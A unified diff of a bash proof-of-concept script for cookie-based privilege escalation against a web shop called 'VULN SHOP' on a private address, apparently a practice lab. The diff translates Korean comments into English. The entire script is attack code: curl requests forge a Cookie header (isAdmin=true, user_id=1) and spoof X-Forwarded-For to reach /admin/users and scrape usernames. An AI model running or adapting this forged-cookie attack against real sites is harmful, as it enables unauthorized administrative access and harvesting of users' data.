@@ -1,45 +1,35 @@
 #!/bin/bash
-# 쿠키 조작을 통한 권한 상승 스크립트
-# 사용법: ./cookie-manipulation.sh
+# Cookie Manipulation - Privilege Escalation PoC
+# Target: VULN SHOP
 
 TARGET="http://192.168.0.28:3000"
 MY_IP="10.0.0.101"
 
-echo "[*] 쿠키 조작 권한 상승 테스트"
-echo "[*] 타겟: $TARGET"
+echo "[*] Cookie-based Privilege Escalation Test"
+echo "[*] Target: $TARGET"
 echo ""
 
-# 일반 사용자 쿠키로 접근
-echo "[1] 일반 사용자 쿠키 (isAdmin=false):"
-echo "---"
+# Normal user access
+echo "[+] Testing as normal user (isAdmin=false)..."
 curl -s -H "X-Forwarded-For: $MY_IP" \
-    -H "Cookie: user=guest; isAdmin=false; user_id=2" \
-    "$TARGET" | grep -E "admin|Manage" | head -5
+  -H "Cookie: user=admin; isAdmin=false; user_id=1" \
+  "$TARGET/profile" | grep -E "(Manage Products|Manage Users)" && echo "Admin menu found!" || echo "No admin menu"
 
 echo ""
-echo ""
 
-# 조작된 관리자 쿠키로 접근
-echo "[2] 조작된 관리자 쿠키 (isAdmin=true):"
-echo "---"
+# Admin access via cookie manipulation
+echo "[+] Testing with manipulated cookie (isAdmin=true)..."
 curl -s -H "X-Forwarded-For: $MY_IP" \
-    -H "Cookie: user=guest; isAdmin=true; user_id=2" \
-    "$TARGET" | grep -E "admin|Manage" | head -5
+  -H "Cookie: user=admin; isAdmin=true; user_id=1" \
+  "$TARGET/profile" | grep -E "(Manage Products|Manage Users)" && echo "Admin menu found!" || echo "No admin menu"
 
 echo ""
+
+# Access admin pages
+echo "[+] Accessing /admin/users..."
+curl -s -H "X-Forwarded-For: $MY_IP" \
+  -H "Cookie: user=admin; isAdmin=true; user_id=1" \
+  "$TARGET/admin/users" | grep -oP 'Username.*?</td>' | head -5
+
 echo ""
-
-# 관리자 페이지 접근
-echo "[3] 관리자 페이지 접근 테스트:"
-echo "---"
-echo "[*] /admin/users 접근 중..."
-USERS=$(curl -s -H "X-Forwarded-For: $MY_IP" \
-    -H "Cookie: user=guest; isAdmin=true; user_id=2" \
-    "$TARGET/admin/users" | grep -oP '(?<=<td style="padding: 10px; border-bottom: 1px solid #eee;">)[^<]+' | head -20)
-
-if [ -n "$USERS" ]; then
-    echo "[+] 권한 상승 성공! 사용자 목록:"
-    echo "$USERS"
-else
-    echo "[-] 접근 실패"
-fi
+echo "[*] Privilege escalation successful if admin menu/pages are accessible!"
